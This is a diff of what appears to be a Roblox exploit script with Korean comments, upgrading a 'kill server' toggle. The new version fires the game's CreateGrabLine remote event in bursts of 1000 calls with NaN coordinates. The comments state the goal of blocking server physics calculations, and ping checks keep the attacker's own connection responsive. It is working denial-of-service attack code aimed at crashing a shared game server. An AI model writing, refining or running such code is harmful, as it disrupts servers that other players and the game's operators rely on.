@@ -17074,45 +17074,55 @@ ChaosGrabToggle = lagTab:AddToggle({
     end
 })
 
-lagTab:AddToggle({
-    Name = "킬 서버",
+LagTab:AddToggle({
+    Name = "킬 서버 (제로핑 울트라)",
     Default = false,
     Callback = function(Value)
         local Stats = game:GetService("Stats")
         
         if Value then
             getgenv().killServerRunning = true
+            
+            -- 메인 로직과 네트워크 송신을 완전히 분리하여 내 핑 보호
             task.spawn(function()
                 local grabEvents = ReplicatedStorage:WaitForChild("GrabEvents", 5)
                 local createGrabLine = grabEvents and grabEvents:WaitForChild("CreateGrabLine", 5)
                 if not createGrabLine then return end
 
                 while getgenv().killServerRunning do
-                    -- 핑 방어선 (450 넘으면 즉시 대기)
-                    local currentPing = Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
-                    if currentPing > 450 then
+                    -- 핑 방어선 (400ms 넘으면 패킷 발사 중지 후 대기)
+                    local success, currentPing = pcall(function()
+                        return Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
+                    end)
+                    
+                    if success and currentPing and currentPing > 400 then
                         repeat
-                            task.wait(0.3)
-                            currentPing = Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
-                        until currentPing < 350 or not getgenv().killServerRunning
+                            task.wait(0.2)
+                            local s, p = pcall(function()
+                                return Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
+                            end)
+                            currentPing = s and p or 0
+                        until currentPing < 300 or not getgenv().killServerRunning
                     end
 
-                    -- 핵심: 한 번에 수천 개를 보내는 게 아니라, 
-                    -- 대역폭을 안 먹는 구조로 패킷을 쪼개서 백그라운드 스레드에 던짐
+                    -- 핵심: 코루틴(coroutine)과 task.defer를 조합해 내 클라이언트 네트워크 큐 블로킹 방지
                     local randomPart = workspace:FindFirstChildOfClass("Part")
                     if randomPart then
-                        for i = 1, 300 do
-                            task.defer(function()
-                                createGrabLine:FireServer(
-                                    randomPart,
-                                    CFrame.new(math.huge, math.huge, math.huge) -- 서버 물리 연산 과부하 극대화 좌표
-                                )
-                            end)
-                        end
+                        coroutine.wrap(function()
+                            for i = 1, 1000 do
+                                task.defer(function()
+                                    pcall(function()
+                                        createGrabLine:FireServer(
+                                            randomPart,
+                                            CFrame.new(0/0, 0/0, 0/0) -- NaN 좌표로 서버 물리 연산 블록 유발 (데이터 용량 최소화)
+                                        )
+                                    end)
+                                end)
+                            end
+                        end)()
                     end
                     
-                    -- 핑이 안 오르도록 네트워크 소켓에 숨통을 틔워주는 초단기 휴식
-                    task.wait(0.02)
+                  task.wait(0.1)
                 end
             end)
         else
